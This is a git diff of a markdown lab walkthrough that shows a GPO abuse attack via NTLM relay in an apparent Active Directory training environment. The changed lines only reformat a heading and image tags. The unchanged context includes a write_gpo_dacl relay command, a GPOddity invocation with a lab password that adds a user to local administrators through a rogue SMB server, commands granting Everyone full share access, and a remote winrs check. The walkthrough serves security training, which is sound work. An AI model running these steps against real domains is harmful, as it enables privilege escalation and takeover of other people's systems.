@@ -1,4 +1,4 @@
-# GPO Abuse NTLM-Relay Attack:
+# GPO Abuse- NTLM-Relay Attack:
 
 ### Relaying hashes <a href="#relaying-hashes" id="relaying-hashes"></a>
 ![NTLM Relay](../assets/image.png)
@@ -55,7 +55,7 @@ Using this ldap shell, we will provide the studentx user, WriteDACL permissions 
 ```batch
 write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
-<figure><img src="../assets/ntlm-relay-2.png" alt=""><figcaption></figcaption></figure>
+![NTLM Relay](../assets/ntlm-relay-2.png)
 
 **NOTE:** Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the '**write_gpo_dacl**' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 
@@ -82,7 +82,7 @@ Now, run the GPOddity command to create the new template.
 cd /mnt/c/AD/Tools/GPOddity
 sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
 ```
-<figure><img src="../assets/gpoddity.png" alt=""><figcaption></figcaption></figure>
+![NTLM Relay](../assets/gpoddity.png)
 
 Leave GPOddity running and from another Ubuntu WSL session, create and share the stdx-gp directory:
 
@@ -91,7 +91,7 @@ mkdir /mnt/c/AD/Tools/stdx-gp
 
 cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
 ```
-<figure><img src="../assets/gpoddity-1.png" alt=""><figcaption></figcaption></figure>
+![NTLM Relay](../assets/gpoddity-1.png)
           
 From a command prompt (Run as Administrator) on the student VM, run the following commands to allow '**Everyone**' full permission on the **stdx-gp share**:
 ```batch
@@ -99,13 +99,13 @@ net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
 
 icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
 ```
-<figure><img src="../assets/gpoddity-2.png" alt=""><figcaption></figcaption></figure>
+![NTLM Relay](../assets/gpoddity-2.png)
           
 Verify if the **gPCfileSysPath** has been modified for the **DevOps Policy**. Run the following **PowerView command**:
 ```powershell
 Get-DomainGPO -Identity 'DevOps Policy'
 ```
-<figure><img src="../assets/gpoddity-3.png" alt=""><figcaption></figcaption></figure>
+![NTLM Relay](../assets/gpoddity-3.png)
 
 The update for this policy is configured to be every 2 minutes in the lab. After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci:
 
@@ -170,4 +170,3 @@ icacls "C:\AD\Tools\GPOddity\GPT_out" /grant Everyone:F /T
 Get-DomainGPO # Check gpcfilesyspath and whenchanged
 winrs -r:dcorp-ci cmd /c "set computername &&; set username"
 </code></pre>
-
